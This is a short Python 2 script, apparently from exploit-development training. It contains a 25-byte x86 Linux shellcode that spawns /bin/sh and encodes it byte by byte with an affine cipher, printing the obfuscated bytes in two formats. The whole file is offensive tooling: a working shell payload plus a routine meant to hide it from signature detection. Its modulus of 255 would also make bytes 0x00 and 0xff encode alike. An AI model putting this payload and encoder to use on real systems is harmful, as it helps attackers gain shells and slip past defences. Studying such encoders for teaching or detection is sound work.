#!/usr/bin/python

# Author:	  evoche
# License:  GPL


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Affine Cipher E(x) = (ax+b) mod m
# modulus m is the size of the data set
# a and b are the keys of the cipher. a must be chosen such that a and m are coprime (a & m are coprime if the only positive integer that evenly divides both of them is 1) 
           
a = 8
b = 11
m = 255

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	
	#affine implementation
	encryptedVal = ((a*x)+b)%m

	encoded += '\\x'
	encoded += '%02x' % encryptedVal

	encoded2 += '0x'
	encoded2 += '%02x,' % encryptedVal

print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
